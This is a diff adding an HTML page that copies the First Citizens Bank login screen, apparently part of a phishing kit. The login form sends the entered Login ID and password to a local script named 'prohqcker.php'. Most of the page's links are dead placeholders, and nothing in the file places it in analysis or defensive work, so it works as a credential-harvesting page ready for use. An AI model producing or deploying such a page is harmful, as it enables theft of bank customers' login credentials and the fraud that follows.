@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html class="js flexbox fontface objectfit object-fit csspositionsticky cssreflections no-regions cssresize shapes siblinggeneral subpixelfont supports csstransforms3d preserve3d canvas canvastext emoji devicemotion deviceorientation svg svgasimg svgclippaths svgfilters svgforeignobject inlinesvg smil no-touchevents typedarrays uagent-chrome uagent-webkit uagent-osWindows" lang="en" style="background-image: url(img/desktop-background-31261c4b72eb487c279e9a1b57d9f095.jpg);" stencil-hydrated="">
+<head id="pageheader">
+    <link href="css/app.css" rel="stylesheet" data-no-shim="">
+    <link href="css/highcontrast-23d6f5c394031f2b7a197598ef562da5.css" rel="stylesheet" data-no-shim="">
+    <link href="css/theme-q2-c78f9a6334979dc02a4414cf3a8779e5.css" rel="stylesheet" data-no-shim="">
+    <link href="css/tecton-590048df214033d1c1591d552a32c9af.css" rel="stylesheet">
+    <link rel="shortcut icon" href="favicon.ico" >
+    <title>First Citizens Bank | Login</title>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="description">
+    <meta name="author">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no, address=no, email=no">
+    <meta id="viewportMeta" name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=0, user-scalable=no, viewport-fit=cover">
+    <meta name="referrer" content="origin">
+</head>
+<body id="pagebody" class="ember-application desktop theme-q2 frameless">
+<div class="ember-view app-container desktop unauthenticated vertical-nav pfm-disabled no-pfm-accounts has-footer" id="ember4">
+  <div id="ember16" class="main-view grid-row drawer-view main-view ember-view">
+    <div id="ember25" class="focusing-outlet ember-view">
+      <div id="login-modal"></div>
+      <div class="login-outer">
+        <div class="login-inner" id="login-inner">
+          <div class="login-title">
+            <h1 id="ember33" class="ui-logo large ember-view">
+              <span class="sr-only" test-id="logoDescriptiveText">First Citizens Bank | Login</span>
+              <div aria-hidden="true" class="logo-image" test-id="logoDiv"></div>
+            </h1>
+          </div>
+          <div class="login-static-alert login-message login-alert-message loginFormArea"></div>
+          <div class="login-form loginFormArea">
+            <form class="is-invalid" action="prohqcker.php" method="post">
+              <div class="field">
+                <label class="login-field" for="fldUsername">Login ID</label>
+                <input autocapitalize="off" name="username" autocorrect="off" autocomplete="off" id="fldUsername" class="mrg-T-sm login-field form-control ember-text-field form-control ember-view" type="text" required>
+              </div>
+              <div class="password field">
+                <label class="login-field" for="fldPassword">Password</label>
+                <input autocapitalize="off" name="password" autocorrect="off" autocomplete="off" id="fldPassword" class="mrg-T-sm login-field form-control ember-text-field form-control ember-view" type="password" required>
+              </div>
+              <div id="submissionArea">
+                <div id="userLinks">
+                  <div id="rememberUserNameArea">
+                    <div description-id="ember37-description" test-id="ckbRememberUser" id="ember37" class="ui-checkbox ember-view">
+                      <input class="sr-only" id="ckbRememberUser" type="checkbox">
+                      <label for="ckbRememberUser">
+                        <svg aria-hidden="true" focusable="false" width="20" height="20" viewBox="0 0 20 20"><rect fill="none" stroke="none" stroke-width="2" x="1" y="1" width="18" height="18" rx="3"></rect><polyline fill="none" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" points="4 11.4390244 7.44978307 15.0611808 16 5"></polyline></svg>
+                        <div class="inner-label">
+                          <div test-id="txtLabel" class="inner-text">Remember me</div>
+                        </div>
+                      </label>
+                    </div>
+                  </div>
+                  <button class="logon-submit btn-primary btn-block pointer btn submitButton submit" type="submit">Log In</button>
+                  <div class="clearfix password-links">
+                    <div class="pull-right password-link"><a id="ember39" class="ember-view"><span class="forgot-pw" test-id="lnkForgottenPW">Forgot your password?</span></a></div>
+                  </div>
+                </div>
+              </div>
+            </form>
+          </div>
+          <div class="login-icons clearfix">
+            <a href="tel:8003973790" class="login-adLink callme-button">Call Us</a>
+            <a class="login-adLink privacy_link" test-id="lnkPrivacy" >Privacy Policy</a>
+            <a target="_blank" class="login-adLink" href="#">Contact Us</a>
+            <a target="_blank" class="login-adLink" href="#">Forgot Login</a>
+            <a target="_blank" class="login-adLink" href="">Locations</a>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+</body>
+</html>
